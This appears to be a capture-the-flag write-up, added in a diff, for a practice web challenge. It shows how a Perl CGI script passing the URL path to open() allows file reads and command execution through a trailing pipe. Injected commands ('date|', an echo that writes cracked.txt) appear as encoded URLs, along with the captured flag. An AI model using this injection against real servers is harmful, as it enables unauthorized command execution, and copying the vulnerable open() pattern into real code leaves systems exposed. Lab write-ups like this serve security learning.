@@ -1,0 +1,171 @@
+## FLAG
+FLAG_n6RBZdrXqrihS8se
+
+## There is a directory list
+
+http://ctfq.sweetduet.info:10080/~q26/
+
+[TXT]	a_scandal_in_bohemia_1.txt	05-Apr-2016 22:40	19K	 
+[TXT]	a_scandal_in_bohemia_2.txt	05-Apr-2016 22:40	21K	 
+[TXT]	a_scandal_in_bohemia_3.txt	05-Apr-2016 22:40	5.9K	 
+[TXT]	flag.txt	05-Apr-2016 22:40	58	 
+[   ]	index.pl	05-Apr-2016 22:40	1.0K	 
+
+I have no access to any of txt files(403 Forbidden)
+
+## I can't access the file from below URL
+
+http://ctfq.sweetduet.info:10080/~q26/a_scandal_in_bohemia_1.txt
+
+## However I can access the file by including "index.pl" in the URL path
+
+http://ctfq.sweetduet.info:10080/~q26/index.pl/a_scandal_in_bohemia_1.txt
+
+## "index.pl" appears to be the perl cgi script. Let's check "flag.txt"
+
+http://ctfq.sweetduet.info:10080/~q26/index.pl/flag.txt
+
+## There was a hint in "flag.txt"
+
+	FROG_CroakCroak
+
+	How about to try to see the source code?
+	
+## Let's check the source code of "index.pl"
+
+http://ctfq.sweetduet.info:10080/~q26/index.pl/index.pl
+
+--------------------------------------------
+
+#!/usr/bin/perl
+use CGI;
+
+print <<'EOS';
+Content-type: text/html; charset=utf-8
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>A SCANDAL IN BOHEMIA</title>
+</head>
+<body>
+<h1>A SCANDAL IN BOHEMIA</h1>
+<div>
+<a href="/~q26/index.pl/a_scandal_in_bohemia_1.txt">A SCANDAL IN BOHEMIA I</a>&nbsp;
+<a href="/~q26/index.pl/a_scandal_in_bohemia_2.txt">A SCANDAL IN BOHEMIA II</a>&nbsp;
+<a href="/~q26/index.pl/a_scandal_in_bohemia_3.txt">A SCANDAL IN BOHEMIA III</a>&nbsp;
+</div>
+<hr>
+<div>
+EOS
+
+
+
+# Can you crack me? :P
+open(F,'cracked.txt');
+my $t = <F>;
+chomp($t);
+if ($t eq 'h@ck3d!') {
+print 'FLAG_****************<br><br>';
+}
+unlink('cracked.txt');
+####
+
+
+
+open(F,substr($ENV{'PATH_INFO'},1));
+
+my $cgi = new CGI;
+$cgi->charset('utf-8');
+while(<F>) {
+chomp;
+s/FLAG_\w+/FLAG_****************/g;
+print $cgi->escapeHTML($_)."<br>\n";
+}
+
+print <<'EOS';
+</div>
+<hr>
+<address>
+http://www.gutenberg.org/files/1661/1661-h/1661-h.htm
+</address>
+</body>
+</html>
+EOS
+
+--------------------------------------------
+
+## "index.pl" does the following
+- It takes URL path as an argument.
+- If the path (file) exist, it will print the contents of file.
+
+## Most important part is the following code.
+
+open(F,'cracked.txt');
+my $t = <F>;
+chomp($t);
+if ($t eq 'h@ck3d!') {
+print 'FLAG_****************<br><br>';
+}
+unlink('cracked.txt');
+
+## If there is a file "cracked.txt" contains string "h@ck3d!", script will print the Flag.
+
+## "index.pl" reads the file using open().
+Perl open() has vulnerability. When you open the file path ends with "|" (pipe) using open(), file path is interpreted as a command.
+
+e.g.) 	open(F, '/pwd|');
+		/home/q26/public_html
+		
+# details about Perl open() vulnerability
+https://www.ipa.go.jp/security/awareness/vendor/programmingv1/a04_01.html
+http://www.cgisecurity.com/lib/sips.html
+https://www.sans.org/security-resources/malwarefaq/guestbook.php
+
+## date command successfully executed.
+
+# curl -i http://ctfq.sweetduet.info:10080/~q26/index.pl/date%7C
+HTTP/1.1 200 OK
+Date: Sat, 09 Apr 2016 14:38:26 GMT
+Server: Apache/2.2.15 (CentOS)
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=utf-8
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>A SCANDAL IN BOHEMIA</title>
+  </head>
+  <body>
+    <h1>A SCANDAL IN BOHEMIA</h1>
+    <div>
+      <a href="/~q26/index.pl/a_scandal_in_bohemia_1.txt">A SCANDAL IN BOHEMIA I</a>&nbsp;
+      <a href="/~q26/index.pl/a_scandal_in_bohemia_2.txt">A SCANDAL IN BOHEMIA II</a>&nbsp;
+      <a href="/~q26/index.pl/a_scandal_in_bohemia_3.txt">A SCANDAL IN BOHEMIA III</a>&nbsp;
+    </div>
+    <hr>
+    <div>
+Sat Apr  9 23:38:42 JST 2016<br>
+    </div>
+    <hr>
+    <address>
+      http://www.gutenberg.org/files/1661/1661-h/1661-h.htm
+    </address>
+  </body>
+</html>
+
+## So all I have to do is create "cracked.txt" and open that file with "index.pl"
+
+## Create "cracked.txt" contains string "h@ck3d!"
+
+echo h@ck3d! > cracked.txt|
+
+## Browse as below
+http://ctfq.sweetduet.info:10080/~q26/index.pl/echo%20h@ck3d!%20%3E%20cracked.txt%7C
+
+## File created. Now, browse "cracked.txt"
+http://ctfq.sweetduet.info:10080/~q26/index.pl/cracked.txt
+
+## Flag appears
+FLAG_n6RBZdrXqrihS8se
